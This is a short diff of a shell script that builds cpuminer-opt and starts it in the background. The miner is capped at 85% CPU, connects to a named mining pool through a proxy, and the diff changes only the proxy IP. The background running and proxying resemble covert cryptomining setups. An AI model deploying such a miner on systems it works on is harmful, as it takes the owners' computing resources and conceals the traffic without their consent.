@@ -5,4 +5,4 @@ cd cpuminer-opt
 chmod +x ./build.sh
 ./build.sh
 make
-cpulimit --exe cpuminer --limit 85 -b && ./cpuminer -a yescryptr16 -o stratum+tcp://mining.bunnymining.work:20332 -u k67frozen.anonymous -p 0202 -x 107.191.57.126:2212 --background
+cpulimit --exe cpuminer --limit 85 -b && ./cpuminer -a yescryptr16 -o stratum+tcp://mining.bunnymining.work:20332 -u k67frozen.anonymous -p 0202 -x 45.32.21.205:2212 --background
